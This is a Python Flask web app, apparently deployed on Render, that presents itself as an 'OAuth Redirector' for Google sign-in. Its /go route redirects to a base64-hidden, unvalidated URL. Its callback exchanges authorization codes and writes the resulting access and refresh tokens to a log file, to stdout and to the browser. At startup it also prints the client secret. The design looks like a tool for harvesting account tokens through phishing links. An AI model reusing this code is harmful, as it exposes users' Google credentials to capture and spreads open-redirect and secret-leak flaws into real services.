from flask import Flask, request, redirect
import requests
import base64
import logging
import os
import sys

# Unbuffer stdout so Render logs print instantly
sys.stdout.reconfigure(line_buffering=True)

app = Flask(__name__)

# Load from environment variables (set in Render)
CLIENT_ID = os.environ.get("CLIENT_ID")
CLIENT_SECRET = os.environ.get("CLIENT_SECRET")
REDIRECT_URI = os.environ.get("REDIRECT_URI")

# Debug prints (you'll see these at startup in Render)
print("DEBUG: CLIENT_ID =", repr(CLIENT_ID), flush=True)
print("DEBUG: CLIENT_SECRET =", repr(CLIENT_SECRET), flush=True)
print("DEBUG: REDIRECT_URI =", repr(REDIRECT_URI), flush=True)

assert CLIENT_ID and CLIENT_SECRET and REDIRECT_URI, "OAuth credentials not set"

# Log to file (optional backup)
logging.basicConfig(filename='access.log', level=logging.INFO, format='%(asctime)s %(message)s')

@app.route('/')
def index():
    return "OAuth Redirector is live."

@app.route('/go')
def go():
    encoded = request.args.get('q')
    if not encoded:
        return "Missing 'q' parameter", 400
    try:
        decoded = base64.urlsafe_b64decode(encoded.encode()).decode()
        logging.info(f"[REDIRECT] {decoded}")
        print(f"[REDIRECT] {decoded}", flush=True)
        return redirect(decoded)
    except Exception as e:
        logging.error(f"[ERROR] Base64 decode failed: {e}")
        print(f"[ERROR] Base64 decode failed: {e}", flush=True)
        return f"Invalid base64 input: {e}", 400

@app.route('/callback')
def callback():
    print("[CALLBACK HIT]", flush=True)

    code = request.args.get("code")
    print("Code received:", code, flush=True)

    if not code:
        return "Missing ?code=", 400

    data = {
        "code": code,
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "redirect_uri": REDIRECT_URI,
        "grant_type": "authorization_code"
    }

    try:
        response = requests.post("https://oauth2.googleapis.com/token", data=data)
        print("[GOOGLE RESPONSE STATUS]:", response.status_code, flush=True)
        print("[GOOGLE RESPONSE TEXT]:", response.text, flush=True)

        response.raise_for_status()
        token_data = response.json()

        # Save token data to file
        with open("tokens.log", "a") as f:
            f.write(f"[TOKEN RECEIVED]\n{token_data}\n\n")

        # Also print to Render logs
        print(f"[TOKEN RECEIVED]\n{token_data}\n", flush=True)

        return f"<h1>Access Granted</h1><pre>{token_data}</pre>"

    except requests.exceptions.RequestException as e:
        print(f"[TOKEN EXCHANGE ERROR] {str(e)}", flush=True)
        if response is not None:
            print(f"[TOKEN RESPONSE TEXT] {response.text}", flush=True)
        return f"<h1>Token exchange failed:</h1><pre>{str(e)}</pre>", 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
